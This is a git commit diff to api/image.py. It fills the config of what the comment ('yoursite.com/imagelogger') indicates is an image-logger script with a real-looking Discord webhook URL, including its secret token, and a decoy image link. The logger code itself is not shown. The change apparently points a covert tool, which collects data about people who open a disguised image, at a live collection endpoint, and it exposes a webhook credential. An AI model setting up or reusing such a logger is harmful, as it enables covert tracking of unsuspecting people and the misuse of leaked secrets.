154a4e34795baa62956d83a13385f07cdf861bd5
YoumuCut <88273598+YoumuCut@users.noreply.github.com>
2025-11-29 12:06:56 +0100

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "WEBHOOK HERE !",
-    "image": "IMAGE HERE !", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1444281491902169120/LUMNAkcf8Mf0w2LGPwIZfr2Mf1xm3O_jBu_o1PccKKaotizCG9mBMfHHNiR4oPUhKNDi",
+    "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT8pGXoYdq6Vs-Uu5VQWgirrJgrNsKr4jbRwQ&s", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
